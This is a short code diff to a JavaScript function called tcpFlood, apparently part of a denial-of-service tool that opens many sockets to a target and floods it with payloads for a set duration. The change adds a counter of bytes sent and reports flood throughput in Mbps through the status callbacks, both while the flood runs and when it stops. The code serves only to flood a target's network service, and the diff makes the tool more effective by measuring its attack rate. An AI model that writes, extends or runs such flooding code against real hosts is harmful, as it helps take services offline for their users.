@@ -39,6 +39,7 @@ async function tcpFlood(target, port = 80, threads = 10, duration = 60, statusCa
   let startTime = Date.now();
   let floodActive = true;
   let packetsSent = 0;
+  let bytesSent = 0; // Track total bytes sent
 
   function removeSocket(socket) {
     const index = sockets.indexOf(socket);
@@ -77,7 +78,12 @@ async function tcpFlood(target, port = 80, threads = 10, duration = 60, statusCa
               "\r\n";
             socket.write(payload);
             packetsSent++;
-            if (statusCallback) statusCallback({ status: 'packet_sent', packets: packetsSent });
+            bytesSent += payload.length; // Update total bytes sent
+            if (statusCallback) statusCallback({
+              status: 'packet_sent',
+              packets: packetsSent,
+              mbps: (bytesSent / (Date.now() - startTime) * 8 / 1000000).toFixed(2) // Calculate MBPS
+            });
 
           } catch (err) {
             console.error(`Thread ${i + 1}: Error sending data: ${err.message}`);
@@ -138,7 +144,7 @@ async function tcpFlood(target, port = 80, threads = 10, duration = 60, statusCa
         console.error("Error destroying socket:", e);
       }
     });
-    if (statusCallback) statusCallback({ status: 'flood_stopped', packets: packetsSent });
+    if (statusCallback) statusCallback({ status: 'flood_stopped', packets: packetsSent, mbps: (bytesSent / (Date.now() - startTime) * 8 / 1000000).toFixed(2) }); // Include MBPS in final status
   }, duration * 1000);
 }
 
